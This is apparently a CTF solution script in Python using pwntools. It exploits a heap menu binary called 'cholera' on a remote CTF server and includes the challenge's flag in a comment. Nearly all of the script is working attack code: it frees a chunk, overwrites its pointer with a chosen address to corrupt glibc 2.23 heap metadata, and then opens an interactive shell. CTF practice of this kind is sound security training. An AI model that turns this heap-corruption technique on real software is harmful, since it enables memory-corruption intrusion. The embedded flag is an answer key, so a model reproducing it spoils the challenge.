#exploit for Cholera
#evlz{l4rg3_b1n_w1th0ut_tc4ch3_1s_m3h}ctf
from pwn import *
import time
elf = ELF("./cholera")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")
context.binary=elf
#target=process([elf.path])
target=remote('pwn.game.alcapwnctf.in',11337)
#context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def edit(index,data):
	sla(">> ",str(2))
	sla(">> ",str(index))
	sla(">> ",data)

def add(size):
	sla(">> ",str(1))
	sla(">> ",str(size))

def free(index):
	sla(">> ",str(3))
	sla(">> ",str(index))

add(0x10)
add(0x10)
free(0)
edit(0,"A"*8+p64(0x601070-0x10))
add(0x10)
sla(">> ",str(0))
target.interactive()
